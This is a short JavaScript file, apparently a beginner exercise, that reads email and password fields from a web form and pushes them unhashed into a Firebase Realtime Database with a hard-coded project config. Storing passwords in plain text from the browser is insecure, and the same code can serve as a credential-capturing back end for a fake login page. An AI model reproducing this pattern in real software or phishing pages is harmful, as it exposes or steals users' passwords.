import { initializeApp } from "https://www.gstatic.com/firebasejs/12.16.0/firebase-app.js";
import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/12.16.0/firebase-database.js";

const firebaseConfig = {
  apiKey: "AIzaSyCkCReXkYkGFLAZf1xsf71nQP_Iq3REHPo",
  authDomain: "mylogin-f8ae6.firebaseapp.com",
  databaseURL: "https://mylogin-f8ae6-default-rtdb.asia-southeast1.firebasedatabase.app",
  projectId: "mylogin-f8ae6",
  storageBucket: "mylogin-f8ae6.firebasestorage.app",
  messagingSenderId: "339013045434",
  appId: "1:339013045434:web:54be0b8212c67227178683"
};

const app = initializeApp(firebaseConfig);
const db = getDatabase(app);

window.showData = function () {
  const email = document.getElementById("email").value;
  const password = document.getElementById("password").value;

  push(ref(db, "users"), {
    email: email,
    password: password
  });

  alert("Data Firebase mein save ho gaya.");
};